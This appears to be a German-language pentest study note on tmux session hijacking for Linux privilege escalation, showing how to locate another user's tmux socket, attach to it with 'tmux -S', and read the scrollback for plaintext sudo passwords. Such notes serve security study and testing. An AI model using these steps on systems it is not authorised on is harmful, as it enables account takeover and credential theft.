---
tags: [technique, privesc, linux]
aliases: [tmux Session Hijacking]
---
# tmux Hijacking

> **tmux** (terminal multiplexer) verwaltet Terminal-Sitzungen, die im Hintergrund weiterlaufen, auch wenn man sich „detacht". Jede Session gehört einem User und läuft mit dessen Rechten. Darf ich auf den **Socket** einer fremden (z.B. root-)Session zugreifen, kann ich mich dranhängen und darin als dieser User Befehle ausführen.

## Warum gefährlich
- tmux legt pro User eine Socket-Datei an: `/tmp/tmux-<uid>/default`.
- Sind die Rechte auf dem Socket zu offen (oder ist es ein Dienstkonto, in dem ich schon stecke), kann ich attachen.
- Oft findet man in der gekaperten Session noch **Historie/Klartext-Passwörter** aus vorherigen Befehlen.

## Finden
```bash
# wer ist eingeloggt und was tut er (Spalte WHAT)
w
# USER  TTY    FROM            ... WHAT
# sadm  pts/3  tmux(1141).%0   ... -bash   <- läuft in einer tmux-Session

# Socket suchen
ls -la /tmp/tmux-*/
# /tmp/tmux-1001/default
```

## Attachen
```bash
tmux -S /tmp/tmux-1001/default attach
```
- `-S <socket>` = „benutze **diesen** Socket" statt des eigenen.

> [!tip] Beute in der Session
> Nach dem Attach die Scrollback-Historie lesen – häufig steht dort ein `echo <pw> | sudo -S ...`, also ein Passwort im Klartext → siehe [[Sudo Abuse]].
